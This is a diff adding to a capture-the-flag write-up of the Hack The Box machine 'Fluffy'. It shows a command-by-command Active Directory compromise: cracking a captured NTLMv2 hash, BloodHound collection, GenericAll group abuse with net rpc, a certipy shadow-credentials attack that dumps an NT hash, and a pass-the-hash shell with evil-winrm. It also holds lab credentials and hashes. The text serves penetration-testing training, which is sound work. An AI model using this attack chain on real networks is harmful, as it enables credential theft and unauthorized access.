@@ -259,9 +259,137 @@ putting file exploit.zip as \exploit.zip (0.9 kb/s) (average 0.9 kb/s)
 [SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:6109f53b6d82f7d7:AF4211657658A3B8F79DFDAC295C9728:0101000000000000809AE9316CD0DB01398EE1FFCFE429340000000002000800330043004700460001001E00570049004E002D004400550038004900440059005500450047004100460004003400570049004E002D00440055003800490044005900550045004700410046002E0033004300470046002E004C004F00430041004C000300140033004300470046002E004C004F00430041004C000500140033004300470046002E004C004F00430041004C0007000800809AE9316CD0DB0106000400020000000800300030000000000000000100000000200000313F0E1DD62774CA1E8F9DDBBB7990F703EA1C141D16C2B7DDFFE296E0CF07720A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00370035000000000000000000                                          
 ```
 
-> we got a hash `p.agila`
+> We now have `NTLM` hash of user `p.agila`. Using hashcat, we can crack the hash
 
 ```console
 p.agila::FLUFFY:44ba23f06d0012ce:2F92099ED0B0BB5FC9F5531238508F8A:0101000000000000802DEDF370CDDB015B78C485618BA9120000000002000800560034004B00310001001E00570049004E002D0058003800350037003300300048004F0033005300510004003400570049004E002D0058003800350037003300300048004F003300530051002E00560034004B0031002E004C004F00430041004C0003001400560034004B0031002E004C004F00430041004C0005001400560034004B0031002E004C004F00430041004C0007000800802DEDF370CDDB010600040002000000080030003000000000000000010000000020000040057427D0CC477C70729646E098F3FFCC99AA397785A5948567ED6E8FF151AE0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00310036000000000000000000
 ```
+
+Use `john` to crack
+
+```console
+┌──(celikd㉿kali)-[~/Desktop]
+└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+prometheusx-303  (p.agila)
+```
+## Bloodhound
+
+```console
+┌──(celikd㉿kali)-[~/Desktop]
+└─$ nxc ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --bloodhound --collection All --dns-server 10.10.66.17
+
+LDAP        10.10.66.17     389        dc01.fluffy.htb
+[-] Error retrieving os arch of 10.10.66.17: Could not connect: timed out
+SMB         10.10.66.17     445        DC01
+[+] Windows 10 / Server 2019 Build 17763 (name: DC01) (domain: fluffy.htb) (signing: True) (SMBv1: False)
+[+] fluffy.htb\j.fleischman: J0elTHEM4n1990!
+
+Resolved collection methods: acl, rdp, objectprops, trusts, session, psremote, group, localadmin, container, dcom  
+Done in 00M 41S
+
+Compressing output into /home/dollarboysushil/.nxc/logs/DC01_10.10.66.17_2025-05-25_050736_bloodhound.zip
+```
+
+
+![map](02.png){: width="1200" height="800" }
+Note that `p.agila` you can add yourself to `service` the user group
+![map](03.png){: width="1200" height="800" }
+Then the group has write permissions `service` for the user `CA_SVC`
+
+## Generic All Exploit
+To exploit Generic All permission, we will add user `p.agila` to Service Accounts group
+
+```console
+net rpc group addmem "Service accounts" "p.agila" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "10.10.66.17"
+```
+
+## Verifying the group membership
+
+```console
+net rpc group members "Service accounts" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "10.10.66.17"
+```
+
+```console
+┌──(celikd㉿kali)-[~/Desktop]
+└─$ net rpc group members "Service accounts" -U "fluffy.htb"/"p.agila%prometheusx-303" -S "10.10.66.17"
+# Output:
+# FLUFFY\ca_svc
+# FLUFFY\ldap_svc
+# FLUFFY\winrm_svc
+
+┌──(celikd㉿kali)-[~/Desktop]
+└─$ net rpc group addmem "Service accounts" "p.agila" -U "fluffy.htb"/"p.agila%prometheusx-303" -S "10.10.66.17"
+
+┌──(celikd㉿kali)-[~/Desktop]
+└─$net rpc group members "Service accounts" -U "fluffy.htb"/"p.agila%prometheusx-303" -S "10.10.66.17"
+# Output:
+# FLUFFY\ca_svc
+# FLUFFY\ldap_svc
+# FLUFFY\p.agila
+# FLUFFY\winrm_svc
+```
+Upon deeper dive, we can see `Service` Accounts Group has `Generic` Write permission over `3 users`. 
+![map](04.png){: width="1200" height="800" }
+
+## Generic Write Exploit
+To exploit Generic Write permisison, we will use certipy-ad to perform shadow Credentials attack and dump the `NTLM` hash.
+```console
+┌──(celikd㉿kali)-[~/Desktop]
+└─$ certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC'                           ⏎
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'winrm_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '5f3391a6-1fa0-c13f-9f4b-73cd3536412f'
+[*] Adding Key Credential with device ID '5f3391a6-1fa0-c13f-9f4b-73cd3536412f' to the Key Credentials for 'winrm_svc'
+[*] Successfully added Key Credential with device ID '5f3391a6-1fa0-c13f-9f4b-73cd3536412f' to the Key Credentials for 'winrm_svc'
+[*] Authenticating as 'winrm_svc' with the certificate
+[*] Using principal: winrm_svc@fluffy.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'winrm_svc.ccache'
+[*] Trying to retrieve NT hash for 'winrm_svc'
+[*] Restoring the old Key Credentials for 'winrm_svc'
+[*] Successfully restored the old Key Credentials for 'winrm_svc'
+[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
+```
+
+```console
+┌──(celikd㉿kali)-[~/Desktop]
+└─$ evil-winrm -i fluffy.htb -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../desktop
+*Evil-WinRM* PS C:\Users\winrm_svc\desktop> ls
+
+
+    Directory: C:\Users\winrm_svc\desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        5/29/2025   7:52 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\winrm_svc\desktop>
+```
+
+## ESC16
+`WINRM_SVC` The user doesn't seem to have anything special
+
+
+
+
 
